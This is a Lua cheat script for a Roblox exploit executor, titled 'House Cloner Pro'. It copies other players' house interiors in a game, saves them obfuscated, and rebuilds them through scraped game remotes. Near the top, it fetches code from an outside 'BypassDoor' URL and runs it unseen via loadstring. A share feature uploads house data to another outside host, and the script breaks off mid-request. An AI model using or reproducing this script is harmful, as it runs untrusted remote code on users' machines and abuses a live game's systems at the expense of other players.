local r = _G.VALIDATION_TOKEN and game:HttpGet("https://system.heatherx.site/validate/onecreatorx/grow-garden/".._G.VALIDATION_TOKEN)
if r ~= "1" then return end
spawn(function()
loadstring(game:HttpGet("https://x.api-x.site/BypassDoor"))()
end)
local RS = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local TS = game:GetService("TweenService")
local HttpS = game:GetService("HttpService")
local CG = game:GetService("CoreGui")
local FR = require(RS:WaitForChild("SharedModules"):WaitForChild("Game"):WaitForChild("FurnitureSelectorHelpers"):WaitForChild("FurnitureRegistry"))
local RS = game:GetService("ReplicatedStorage")

local function findr(name)
	for _, obj in ipairs(getgc(true)) do
		if type(obj) == "table" then
			for k, v in pairs(obj) do
				if k == name and typeof(v) == "Instance" and v:IsA("RemoteFunction") then
					return v
				end
			end
		end
	end
	return nil
end

local aR = findr("HousingAPI/UpdateAmbianceProperties")
local tR = findr("HousingAPI/BuyTexture")

local LP = Players.LocalPlayer
local API = RS.API
local houses = {}
local pName = LP.Name:gsub("%W", "")
local prices = {}
local hU = false
local hH = false

local function cI(cN, props, parent)
	local i = Instance.new(cN)
	for k, v in pairs(props) do
		i[k] = v
	end
	if parent then
		i.Parent = parent
	end
	return i
end

local HttpS = game:GetService("HttpService")
local localKey = 85

local function customEnc(data)
	local encodedBytes = {}
	for i = 1, #data do
		local xorByte = bit32.bxor(data:byte(i), localKey)
		encodedBytes[i] = string.char(xorByte)
	end
	return table.concat(encodedBytes):reverse()
end

local function customDec(data)
	local unreversed = data:reverse()
	local decodedBytes = {}
	for i = 1, #unreversed do
		local originalByte = bit32.bxor(unreversed:byte(i), localKey)
		decodedBytes[i] = string.char(originalByte)
	end
	return table.concat(decodedBytes)
end

local function prepareForJSON(obj)
	if typeof(obj) == "Color3" then
		return {obj.R, obj.G, obj.B}
	elseif typeof(obj) == "CFrame" then
		return {obj:GetComponents()}
	elseif typeof(obj) == "Vector3" then
		return {obj.X, obj.Y, obj.Z}
	elseif type(obj) == "table" then
		local t = {}
		for k, v in pairs(obj) do
			t[k] = prepareForJSON(v)
		end
		return t
	else
		return obj
	end
end

local function deobfuscateAuto(data)
	local success, result = pcall(function()
		return HttpS:JSONDecode(data)
	end)
	if success then
		return result
	end
	local decoded = customDec(data)
	local ok, decodedJson = pcall(function()
		return HttpS:JSONDecode(decoded)
	end)
	if ok then
		return decodedJson
	end
	return nil
end

local function cF(props, parent)
	local f = cI("Frame", props, parent)
	cI("UICorner", {CornerRadius = UDim.new(0, 8)}, f)
	return f
end

local function cB(props, parent)
	local b = cI("TextButton", props, parent)
	cI("UICorner", {CornerRadius = UDim.new(0, 8)}, b)
	return b
end

local function cCard(size, pos, color, parent)
	return cF({Size = size, Position = pos or UDim2.new(0, 0, 0, 0), BackgroundColor3 = color or Color3.fromRGB(45, 45, 50), BorderSizePixel = 0}, parent)
end

local function procColors(raw)
	if not raw or type(raw) ~= "table" then return {} end

	local isAmbient = false
	for k, v in pairs(raw) do
		if type(k) == "string" and type(v) == "number" then
			isAmbient = true
			break
		elseif typeof(v) == "table" and #v == 3 then
			isAmbient = true
			break
		end
	end

	if isAmbient then
		local ambient = {}
		for k, v in pairs(raw) do
			if typeof(v) == "table" and #v == 3 then
				ambient[k] = Color3.new(unpack(v))
			elseif type(v) == "number" then
				if raw[k + 1] and raw[k + 2] then
					ambient[k] = Color3.new(v, raw[k + 1], raw[k + 2])
				end
			end
		end
		return ambient
	end

	local values = {}
	for _, v in pairs(raw) do
		if type(v) == "number" then
			table.insert(values, v)
		end
	end

	local furnitureColors = {}
	for i = 1, #values, 3 do
		if values[i + 2] then
			table.insert(furnitureColors, Color3.new(values[i], values[i + 1], values[i + 2]))
		end
	end

	return furnitureColors
end

local RS = game:GetService("ReplicatedStorage")
local prices = {}

local function fetchPrices()
	for _, module in ipairs(RS:GetDescendants()) do
		if module:IsA("ModuleScript") then
			local ok, data = pcall(require, module)
			if ok and type(data) == "table" then
				for _, entry in pairs(data) do
					if type(entry) == "table" and typeof(entry.id) == "string" and typeof(entry.cost) == "number" then
						prices[entry.id] = entry.cost
					end
				end
			end
		end
	end
end

local function calcPrice(f)
	local t, c = 0, 0
	for _, i in pairs(f) do
		if i.id then
			local p = prices[i.id] or 0
			t += p
			c += 1
		end
	end
	return t, c
end

local function fmtPrice(p)
	if p == 0 then return "FREE" end
	if p < 1000 then return "$" .. p end
	if p < 1e6 then return "$" .. math.floor(p / 100) / 10 .. "K" end
	if p < 1e9 then return "$" .. math.floor(p / 1e5) / 10 .. "M" end
	return "$" .. math.floor(p / 1e8) / 10 .. "B"
end

task.spawn(fetchPrices)

local gui = cI("ScreenGui", {Name = "HClone", ResetOnSpawn = false, ZIndexBehavior = Enum.ZIndexBehavior.Sibling})
if syn and syn.protect_gui then
	syn.protect_gui(gui)
	gui.Parent = CG
elseif gethui then
	gui.Parent = gethui()
else
	gui.Parent = CG
end

local mF = cF({Name = "Main", Size = UDim2.new(0, 400, 0, 500), Position = UDim2.new(1, -420, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5), BackgroundColor3 = Color3.fromRGB(30, 30, 35), BorderSizePixel = 0, ClipsDescendants = true}, gui)

cI("ImageLabel", {Name = "Shadow", AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1, Position = UDim2.new(0.5, 0, 0.5, 0), Size = UDim2.new(1, 30, 1, 30), ZIndex = -1, Image = "rbxassetid://6014261993", ImageColor3 = Color3.new(0, 0, 0), ImageTransparency = 0.5, ScaleType = Enum.ScaleType.Slice, SliceCenter = Rect.new(49, 49, 450, 450)}, mF)

local head = cF({Name = "Head", Size = UDim2.new(1, 0, 0, 50), BackgroundColor3 = Color3.fromRGB(40, 40, 45), BorderSizePixel = 0}, mF)

cI("Frame", {Name = "Fix", Size = UDim2.new(1, 0, 0, 10), Position = UDim2.new(0, 0, 1, -10), BackgroundColor3 = Color3.fromRGB(40, 40, 45), BorderSizePixel = 0, ZIndex = 2}, head)

cI("TextLabel", {Name = "Title", Size = UDim2.new(1, -20, 1, 0), Position = UDim2.new(0, 20, 0, 0), BackgroundTransparency = 1, Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 22, TextXAlignment = Enum.TextXAlignment.Left, Text = "House Cloner"}, head)

local cBtn = cI("TextButton", {Name = "Close", Size = UDim2.new(0, 30, 0, 30), Position = UDim2.new(1, -40, 0, 10), BackgroundColor3 = Color3.fromRGB(255, 80, 80), Text = ""}, head)
cI("UICorner", {CornerRadius = UDim.new(0, 15)}, cBtn)

local mBtn = cI("TextButton", {Name = "Min", Size = UDim2.new(0, 30, 0, 30), Position = UDim2.new(1, -80, 0, 10), BackgroundColor3 = Color3.fromRGB(255, 200, 50), Text = ""}, head)
cI("UICorner", {CornerRadius = UDim.new(0, 15)}, mBtn)

local tabC = cI("Frame", {Name = "TabC", Size = UDim2.new(1, 0, 0, 40), Position = UDim2.new(0, 0, 0, 50), BackgroundColor3 = Color3.fromRGB(35, 35, 40), BorderSizePixel = 0}, mF)
cI("UIListLayout", {FillDirection = Enum.FillDirection.Horizontal, HorizontalAlignment = Enum.HorizontalAlignment.Left, VerticalAlignment = Enum.VerticalAlignment.Center, Padding = UDim.new(0, 0)}, tabC)

local hTab = cI("TextButton", {Name = "HTab", Size = UDim2.new(0.5, 0, 1, 0), BackgroundColor3 = Color3.fromRGB(60, 120, 190), Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 16, Text = "HOUSES"}, tabC)
local iTab = cI("TextButton", {Name = "ITab", Size = UDim2.new(0.5, 0, 1, 0), BackgroundColor3 = Color3.fromRGB(35, 35, 40), Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(180, 180, 180), TextSize = 16, Text = "INFO"}, tabC)

local contC = cI("Frame", {Name = "Cont", Size = UDim2.new(1, 0, 1, -90), Position = UDim2.new(0, 0, 0, 90), BackgroundTransparency = 1}, mF)
local hContent = cI("Frame", {Name = "HC", Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Visible = true}, contC)
local iContent = cI("Frame", {Name = "IC", Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Visible = false}, contC)

local statC = cCard(UDim2.new(1, -40, 0, 80), UDim2.new(0, 20, 0, 0), Color3.fromRGB(45, 45, 50), hContent)
local statL = cI("UIListLayout", {FillDirection = Enum.FillDirection.Horizontal, HorizontalAlignment = Enum.HorizontalAlignment.Center, VerticalAlignment = Enum.VerticalAlignment.Center, Padding = UDim.new(0, 20)}, statC)
local hCount = cI("Frame", {Name = "HC", Size = UDim2.new(0, 100, 0, 60), BackgroundTransparency = 1}, statC)
local cVal = cI("TextLabel", {Name = "CV", Size = UDim2.new(1, 0, 0, 30), BackgroundTransparency = 1, Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 24, Text = "0"}, hCount)
cI("TextLabel", {Name = "CL", Size = UDim2.new(1, 0, 0, 20), Position = UDim2.new(0, 0, 1, -20), BackgroundTransparency = 1, Font = Enum.Font.Gotham, TextColor3 = Color3.fromRGB(200, 200, 200), TextSize = 14, Text = "Houses Saved"}, hCount)

local pInfo = cI("Frame", {Name = "PI", Size = UDim2.new(0, 150, 0, 60), BackgroundTransparency = 1}, statC)
local pNameL = cI("TextLabel", {Name = "PN", Size = UDim2.new(1, 0, 0, 30), BackgroundTransparency = 1, Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 18, Text = LP.Name}, pInfo)
cI("TextLabel", {Name = "PL", Size = UDim2.new(1, 0, 0, 20), Position = UDim2.new(0, 0, 1, -20), BackgroundTransparency = 1, Font = Enum.Font.Gotham, TextColor3 = Color3.fromRGB(200, 200, 200), TextSize = 14, Text = "Current Player"}, pInfo)

local sBar = cCard(UDim2.new(1, -40, 0, 40), UDim2.new(0, 20, 0, 90), Color3.fromRGB(50, 50, 55), hContent)
cI("ImageLabel", {Name = "SI", Size = UDim2.new(0, 20, 0, 20), Position = UDim2.new(0, 15, 0.5, -10), BackgroundTransparency = 1, Image = "rbxassetid://3605022185", ImageColor3 = Color3.fromRGB(180, 180, 180)}, sBar)
local sBox = cI("TextBox", {Name = "SB", Size = UDim2.new(1, -50, 1, -10), Position = UDim2.new(0, 45, 0, 5), BackgroundTransparency = 1, Font = Enum.Font.Gotham, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 16, TextXAlignment = Enum.TextXAlignment.Left, PlaceholderText = "Search by ID or owner...", PlaceholderColor3 = Color3.fromRGB(150, 150, 150), Text = "", ClearTextOnFocus = false}, sBar)

local hScroll = cI("ScrollingFrame", {Name = "HS", Size = UDim2.new(1, -40, 1, -140), Position = UDim2.new(0, 20, 0, 140), BackgroundTransparency = 1, BorderSizePixel = 0, ScrollBarThickness = 6, ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100), CanvasSize = UDim2.new(0, 0, 0, 0)}, hContent)
local hList = cI("UIListLayout", {Padding = UDim.new(0, 10)}, hScroll)
local iScroll = cI("ScrollingFrame", {Name = "IS", Size = UDim2.new(1, -40, 1, 0), Position = UDim2.new(0, 20, 0, 0), BackgroundTransparency = 1, BorderSizePixel = 0, ScrollBarThickness = 6, ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100), CanvasSize = UDim2.new(0, 0, 0, 0)}, iContent)
local iLayout = cI("UIListLayout", {Padding = UDim.new(0, 15)}, iScroll)

local appCard = cCard(UDim2.new(1, 0, 0, 150), nil, nil, iScroll)
local appT = cI("TextLabel", {Name = "AT", Size = UDim2.new(1, -30, 0, 40), Position = UDim2.new(0, 15, 0, 15), BackgroundTransparency = 1, Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 24, TextXAlignment = Enum.TextXAlignment.Left, Text = "House Cloner Pro"}, appCard)
local appV = cI("TextLabel", {Name = "AV", Size = UDim2.new(1, -30, 0, 20), Position = UDim2.new(0, 15, 0, 55), BackgroundTransparency = 1, Font = Enum.Font.Gotham, TextColor3 = Color3.fromRGB(200, 200, 200), TextSize = 16, TextXAlignment = Enum.TextXAlignment.Left, Text = "Version 1.4"}, appCard)
local appC = cI("TextLabel", {Name = "AC", Size = UDim2.new(1, -30, 0, 20), Position = UDim2.new(0, 15, 0, 80), BackgroundTransparency = 1, Font = Enum.Font.Gotham, TextColor3 = Color3.fromRGB(200, 200, 200), TextSize = 16, TextXAlignment = Enum.TextXAlignment.Left, Text = "Created by: OneCreatorX"}, appCard)
cI("TextLabel", {Name = "AD", Size = UDim2.new(1, -30, 0, 40), Position = UDim2.new(0, 15, 0, 105), BackgroundTransparency = 1, Font = Enum.Font.Gotham, TextColor3 = Color3.fromRGB(180, 180, 180), TextSize = 14, TextXAlignment = Enum.TextXAlignment.Left, TextWrapped = true, Text = "Clone and save house designs with ease. Customize your experience with this powerful tool."}, appCard)

local socialC = cCard(UDim2.new(1, 0, 0, 120), nil, nil, iScroll)
cI("TextLabel", {Name = "ST", Size = UDim2.new(1, -30, 0, 30), Position = UDim2.new(0, 15, 0, 15), BackgroundTransparency = 1, Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 18, TextXAlignment = Enum.TextXAlignment.Left, Text = ". Social"}, socialC)
local socialL = cI("UIGridLayout", {CellSize = UDim2.new(0.33, -15, 0, 40), CellPadding = UDim2.new(0, 10, 0, 10), HorizontalAlignment = Enum.HorizontalAlignment.Center, VerticalAlignment = Enum.VerticalAlignment.Center}, socialC)
local discBtn = cB({Name = "DB", BackgroundColor3 = Color3.fromRGB(88, 101, 242), Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 14, Text = "DISCORD"}, socialC)
local ytBtn = cB({Name = "YB", BackgroundColor3 = Color3.fromRGB(255, 0, 0), Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 14, Text = "YOUTUBE"}, socialC)
local webBtn = cB({Name = "WB", BackgroundColor3 = Color3.fromRGB(60, 120, 190), Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 14, Text = "WEBSITE"}, socialC)

local loadCard = cCard(UDim2.new(1, 0, 0, 150), nil, nil, iScroll)
cI("TextLabel", {Name = "LT", Size = UDim2.new(1, -30, 0, 30), Position = UDim2.new(0, 15, 0, 15), BackgroundTransparency = 1, Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 18, TextXAlignment = Enum.TextXAlignment.Left, Text = "Load House Data"}, loadCard)
local loadIn = cI("TextBox", {Name = "LI", Size = UDim2.new(1, -30, 0, 40), Position = UDim2.new(0, 15, 0, 50), BackgroundColor3 = Color3.fromRGB(50, 50, 55), Font = Enum.Font.Gotham, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 14, PlaceholderText = "Enter file name or URL...", PlaceholderColor3 = Color3.fromRGB(150, 150, 150), Text = "", ClearTextOnFocus = false}, loadCard)
cI("UICorner", {CornerRadius = UDim.new(0, 8)}, loadIn)
local loadBtn = cB({Name = "LB", Size = UDim2.new(0, 100, 0, 36), Position = UDim2.new(0.5, -50, 0, 100), BackgroundColor3 = Color3.fromRGB(60, 120, 190), Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 14, Text = "LOAD"}, loadCard)

local privC = cCard(UDim2.new(1, 0, 0, 120), nil, nil, iScroll)
cI("TextLabel", {Name = "PT", Size = UDim2.new(1, -30, 0, 30), Position = UDim2.new(0, 15, 0, 15), BackgroundTransparency = 1, Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 18, TextXAlignment = Enum.TextXAlignment.Left, Text = "Privacy Settings"}, privC)
local hideUBtn = cB({Name = "HU", Size = UDim2.new(0, 30, 0, 30), Position = UDim2.new(0, 15, 0, 55), BackgroundColor3 = Color3.fromRGB(60, 60, 65), Text = ""}, privC)
cI("TextLabel", {Name = "HUL", Size = UDim2.new(0, 150, 0, 20), Position = UDim2.new(0, 55, 0, 60), BackgroundTransparency = 1, Font = Enum.Font.Gotham, TextColor3 = Color3.fromRGB(200, 200, 200), TextSize = 14, TextXAlignment = Enum.TextXAlignment.Left, Text = "Hide Username"}, privC)
local hideHBtn = cB({Name = "HHB", Size = UDim2.new(0, 30, 0, 30), Position = UDim2.new(0, 15, 0, 95), BackgroundColor3 = Color3.fromRGB(60, 60, 65), Text = ""}, privC)
cI("TextLabel", {Name = "HHL", Size = UDim2.new(0, 150, 0, 20), Position = UDim2.new(0, 55, 0, 100), BackgroundTransparency = 1, Font = Enum.Font.Gotham, TextColor3 = Color3.fromRGB(200, 200, 200), TextSize = 14, TextXAlignment = Enum.TextXAlignment.Left, Text = "Hide House Info"}, privC)

local function updPrivBtn(btn, active)
	if active then
		btn.BackgroundColor3 = Color3.fromRGB(60, 170, 100)
		local check = Instance.new("TextLabel")
		check.Name = "Check"
		check.Size = UDim2.new(1, 0, 1, 0)
		check.BackgroundTransparency = 1
		check.Font = Enum.Font.GothamBold
		check.TextColor3 = Color3.fromRGB(255, 255, 255)
		check.TextSize = 18
		check.Text = "✓"
		check.Parent = btn
	else
		pcall(function()
			btn.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
			local check = btn:FindFirstChild("Check")
			if check then check:Destroy() end
		end)
	end
end

local function isValid(d)
	if not d or #d < 3 then return false end
	if d[2] ~= "house_interior" then return false end
	local hi = d[3]
	return type(hi) == "table" and hi.house_id and hi.building_type and hi.unique and hi.furniture
end

local function updHCount()
	local c = 0
	for _ in pairs(houses) do
		c = c + 1
	end
	cVal.Text = tostring(c)
end

local function isOwner(o)
	if not o then return false end
	local lp = LP.Name:lower()
	local lpd = LP.DisplayName:lower()
	local on = o:lower()
	return on == lp or on == lpd
end

local function hideO(o)
	return hU and isOwner(o)
end

local function cloneHouse(h)
    local allFurnitureItems = {}
    
    for id, item in pairs(h.furniture) do
        if item.id then
            local cframeData
            if type(item.cframe) == "table" then
                cframeData = CFrame.new(table.unpack(item.cframe))
            else
                cframeData = item.cframe
            end
            
            local colors = item.colors or {}
            if item.colors and next(item.colors) and typeof(item.colors[1]) ~= "Color3" then
                colors = procColors(item.colors)
            end
            
            table.insert(allFurnitureItems, {
                kind = item.id,
                properties = {
                    cframe = cframeData,
                    colors = colors,
                    scale = item.scale or 1
                }
            })
        end
    end
    
    local function processAmbiance()
        if h.ambiance and h.ambiance.custom_props then
            for cat, props in pairs(h.ambiance.custom_props) do
                if type(props) == "table" then
                    for n, v in pairs(props) do
                        local processedValue = v
                        if typeof(v) == "table" or (type(v) == "number" and (n:find("Color") or n:find("Ambient") or n:find("Tint"))) then
                            local colorData = {}
                            if type(v) == "number" then
                                colorData = procColors({[n] = v, [n+1] = props[n+1], [n+2] = props[n+2]})[1]
                            else
                                colorData = procColors({v})[1] or Color3.new(1, 1, 1)
                            end
                            processedValue = colorData
                        end
                        local data = {}
                        data[cat] = {}
                        data[cat][n] = processedValue
                        aR:FireServer(data)
                        task.wait(0.7)
                    end
                end
            end
        end
    end
    
    local function processTextures()
        if h.textures then
            for r, rT in pairs(h.textures) do
                if type(rT) == "table" then
                    if rT.floors then
                        tR:FireServer(r, "floors", rT.floors)
                        task.wait(0.1)
                    end
                    if rT.walls then
                        tR:FireServer(r, "walls", rT.walls)
                        task.wait(0.1)
                    end
                end
            end
        end
    end
    
    task.spawn(processAmbiance)
    task.spawn(processTextures)
    
    pcall(function() 
        return FR.buy_furniture(allFurnitureItems)
    end)
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "House Cloner",
        Text = "House cloned successfully!",
        Duration = 3
    })
end

local function showDModal(h)
	local bg = cI("Frame", {Name = "MB", Size = UDim2.new(1, 0, 1, 0), BackgroundColor3 = Color3.new(0, 0, 0), BackgroundTransparency = 0.5, ZIndex = 100}, gui)
	local m = cCard(UDim2.new(0, 350, 0, 300), UDim2.new(0.5, -175, 0.5, -150), Color3.fromRGB(40, 40, 45), bg)
	m.ZIndex = 101
	cI("TextLabel", {Name = "MT", Size = UDim2.new(1, -30, 0, 30), Position = UDim2.new(0, 15, 0, 15), BackgroundTransparency = 1, Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 20, TextXAlignment = Enum.TextXAlignment.Left, Text = "Download House Data", ZIndex = 102}, m)
	
	local itemCount = 0
	local totalPrice = 0
	for _, item in pairs(h.furniture) do
		if item.id then
			itemCount = itemCount + 1
			totalPrice = totalPrice + (prices[item.id] or 0)
		end
	end
	
	local hInfo = cI("TextLabel", {Name = "HI", Size = UDim2.new(1, -30, 0, 60), Position = UDim2.new(0, 15, 0, 50), BackgroundTransparency = 1, Font = Enum.Font.Gotham, TextColor3 = Color3.fromRGB(200, 200, 200), TextSize = 14, TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top, TextWrapped = true, Text = "House ID: " .. h.house_id .. "\nOwner: " .. h.owner .. "\nItems: " .. itemCount, ZIndex = 102}, m)
	local pL = cI("TextLabel", {Name = "PL", Size = UDim2.new(1, -30, 0, 20), Position = UDim2.new(0, 15, 0, 115), BackgroundTransparency = 1, Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(200, 200, 200), TextSize = 15, TextXAlignment = Enum.TextXAlignment.Left, Text = "Price: " .. fmtPrice(totalPrice), ZIndex = 102}, m)
	local fnInput = cI("TextBox", {Name = "FI", Size = UDim2.new(1, -30, 0, 40), Position = UDim2.new(0, 15, 0, 170), BackgroundColor3 = Color3.fromRGB(50, 50, 55), Font = Enum.Font.Gotham, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 14, PlaceholderText = "Enter filename...", PlaceholderColor3 = Color3.fromRGB(150, 150, 150), Text = h.house_id .. "_" .. h.uid:sub(-6), ClearTextOnFocus = false, ZIndex = 102}, m)
	cI("UICorner", {CornerRadius = UDim.new(0, 8)}, fnInput)
	local dlBtn = cB({Name = "DB", Size = UDim2.new(0, 150, 0, 40), Position = UDim2.new(0.5, -75, 0, 230), BackgroundColor3 = Color3.fromRGB(60, 170, 100), Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 14, Text = "DOWNLOAD", ZIndex = 102}, m)
	local closeBtn = cB({Name = "CB", Size = UDim2.new(0, 30, 0, 30), Position = UDim2.new(1, -40, 0, 10), BackgroundColor3 = Color3.fromRGB(255, 80, 80), Text = "", ZIndex = 102}, m)
	cI("UICorner", {CornerRadius = UDim.new(0, 15)}, closeBtn)
	closeBtn.MouseButton1Click:Connect(function() bg:Destroy() end)
	dlBtn.MouseButton1Click:Connect(function()
	local fn = fnInput.Text
	if fn == "" then fn = h.house_id .. "_" .. h.uid:sub(-6) end
	local json = HttpS:JSONEncode(prepareForJSON(h))
	local obfuscated = customEnc(json)
	if writefile then
		writefile(fn .. ".json", obfuscated)
		dlBtn.Text = "COPIED FILENAME"
		if setclipboard then setclipboard(fn) end
		task.delay(2, function() dlBtn.Text = "DOWNLOADED" end)
	else
		if setclipboard then
			setclipboard(obfuscated)
			dlBtn.Text = "DATA COPIED"
		else
			dlBtn.Text = "NOT SUPPORTED"
		end
	end
end)
end

local function createHCard(h)
	local card = cCard(UDim2.new(1, 0, 0, 140), nil, nil, hScroll)
	card.Name = "HC_" .. h.uid:sub(-6)
	local typeTag = cF({Name = "TTag", Size = UDim2.new(0, 100, 0, 24), Position = UDim2.new(0, 15, 0, 15), BackgroundColor3 = Color3.fromRGB(60, 120, 190)}, card)
	cI("UICorner", {CornerRadius = UDim.new(0, 12)}, typeTag)
	cI("TextLabel", {Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 12, Text = h.building_type:gsub("_", " "):upper()}, typeTag)
	local srcTag = cF({Name = "STag", Size = UDim2.new(0, 60, 0, 24), Position = UDim2.new(0, 125, 0, 15), BackgroundColor3 = Color3.fromRGB(100, 100, 220)}, card)
	cI("UICorner", {CornerRadius = UDim.new(0, 12)}, srcTag)
	cI("TextLabel", {Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 12, Text = "[GAME]"}, srcTag)
	local isLP = hideO(h.owner)
	local idLabel = cI("TextLabel", {Name = "ID", Size = UDim2.new(0, 200, 0, 20), Position = UDim2.new(0, 15, 0, 50), BackgroundTransparency = 1, Font = Enum.Font.GothamBold, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 16, TextXAlignment = Enum.TextXAlignment.Left, Text = "ID: " .. ((hH or isLP) and "Hidden" or h.house_id)}, card)
	local ownerL = cI("TextLabel", {Name = "OL", Size = UDim2.new(0, 200, 0, 20), Position = UDim2.new(0, 15, 0, 75), BackgroundTransparency = 1, Font = Enum.Font.Gotham, TextColor3 = Color3.fromRGB(200, 200, 200), TextSize = 14, TextXAlignment = Enum.TextXAlignment.Left, Text = "Owner: " .. ((hH or isLP) and "Hidden" or h.owner)}, card)
	local uidL = cI("TextLabel", {Name = "UL", Size = UDim2.new(0, 200, 0, 20), Position = UDim2.new(0, 15, 0, 100), BackgroundTransparency = 1, Font = Enum.Font.Gotham, TextColor3 = Color3.fromRGB(150, 150, 150), TextSize = 12, TextXAlignment = Enum.TextXAlignment.Left, Text = "UID: " .. ((hH or isLP) and "Hidden" or h.uid:sub(-12))}, card)
	
	local itemCount = 0
	local totalPrice = 0
	for _ in pairs(h.furniture) do 
		itemCount = itemCount + 1 
		if h.furniture[_].id then
			totalPrice = totalPrice + (prices[h.furniture[_].id] or 0)
		end
	end
	
	cI("TextLabel", {Name = "FC", Size = UDim2.new(0, 100, 0, 20), Position = UDim2.new(1, -115, 0, 15), BackgroundTransparency = 1, Font = Enum.Font.Gotham, TextColor3 = Color3.fromRGB(150, 150, 150), TextSize = 12, TextXAlignment = Enum.TextXAlignment.Right, Text = itemCount .. " items"}, card)
	local pLabel = cI("TextLabel", {Name = "PrL", Size = UDim2.new(0, 100, 0, 20), Position = UDim2.new(1, -115, 0, 35), BackgroundTransparency = 1, Font = Enum.Font.Gotham, TextColor3 = Color3.fromRGB(100, 200, 100), TextSize = 12, TextXAlignment = Enum.TextXAlignment.Right, Text = "Price: " .. fmtPrice(totalPrice)}, card)
	
	local shareBtn = cB({
		Name = "SB", 
		Size = UDim2.new(0, 90, 0, 25), 
		Position = UDim2.new(1, -105, 0, 70),
		BackgroundColor3 = Color3.fromRGB(100, 100, 220), 
		Font = Enum.Font.GothamBold, 
		TextColor3 = Color3.fromRGB(255, 255, 255), 
		TextSize = 14, 
		Text = "SHARE"
	}, card)

	local function showShareModal(messageText, urls)
	local bg = cI("Frame", {
		Name = "SMB", 
		Size = UDim2.new(1, 0, 1, 0), 
		BackgroundColor3 = Color3.new(0, 0, 0), 
		BackgroundTransparency = 0.5, 
		ZIndex = 100
	}, gui)

	local m = cCard(UDim2.new(0, 400, 0, urls and 250 or 180), UDim2.new(0.5, -200, 0.5, urls and -125 or -90), Color3.fromRGB(40, 40, 45), bg)
	m.ZIndex = 101

	cI("TextLabel", {
		Name = "MT", 
		Size = UDim2.new(1, -30, 0, 40), 
		Position = UDim2.new(0, 15, 0, 15), 
		BackgroundTransparency = 1, 
		Font = Enum.Font.GothamBold, 
		TextColor3 = Color3.fromRGB(255, 255, 255), 
		TextSize = 18, 
		TextXAlignment = Enum.TextXAlignment.Left, 
		TextWrapped = true,
		Text = messageText, 
		ZIndex = 102
	}, m)

	if urls then
		for i, url in ipairs(urls) do
			local urlBox = cI("TextBox", {
				Name = "UB" .. i, 
				Size = UDim2.new(1, -30, 0, 30), 
				Position = UDim2.new(0, 15, 0, 55 + ((i - 1) * 35)), 
				BackgroundColor3 = Color3.fromRGB(50, 50, 55), 
				Font = Enum.Font.Gotham, 
				TextColor3 = Color3.fromRGB(255, 255, 255), 
				TextSize = 13, 
				Text = url, 
				ClearTextOnFocus = false, 
				ZIndex = 102
			}, m)
			cI("UICorner", {CornerRadius = UDim.new(0, 6)}, urlBox)
		end
	else
		local urlBox = cI("TextBox", {
			Name = "UB", 
			Size = UDim2.new(1, -30, 0, 40), 
			Position = UDim2.new(0, 15, 0, 60), 
			BackgroundColor3 = Color3.fromRGB(50, 50, 55), 
			Font = Enum.Font.Gotham, 
			TextColor3 = Color3.fromRGB(255, 255, 255), 
			TextSize = 14, 
			Text = messageText, 
			ClearTextOnFocus = false, 
			ZIndex = 102
		}, m)
		cI("UICorner", {CornerRadius = UDim.new(0, 8)}, urlBox)
	end

	local copyBtn = cB({
		Name = "CB", 
		Size = UDim2.new(0, 150, 0, 40), 
		Position = UDim2.new(0.5, -75, 1, -50), 
		BackgroundColor3 = Color3.fromRGB(60, 120, 190), 
		Font = Enum.Font.GothamBold, 
		TextColor3 = Color3.fromRGB(255, 255, 255), 
		TextSize = 14, 
		Text = "CERRAR", 
		ZIndex = 102
	}, m)

	copyBtn.MouseButton1Click:Connect(function()
		bg:Destroy()
	end)
end

local isSharing = false

shareBtn.MouseButton1Click:Connect(function()
	if isSharing then
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Por favor espera",
			Text = "Ya se está generando un link...",
			Duration = 2
		})
		return
	end

	isSharing = true
	shareBtn.AutoButtonColor = false
	shareBtn.Text = "Generando link..."
	shareBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 180)

	local json = HttpS:JSONEncode(prepareForJSON(h))
local b64 = customEnc(json)

local req = (http_request or request or (syn and syn.request) or (fluxus and fluxus.request))
local res = req({
	Url = "https://share.api-x.site",
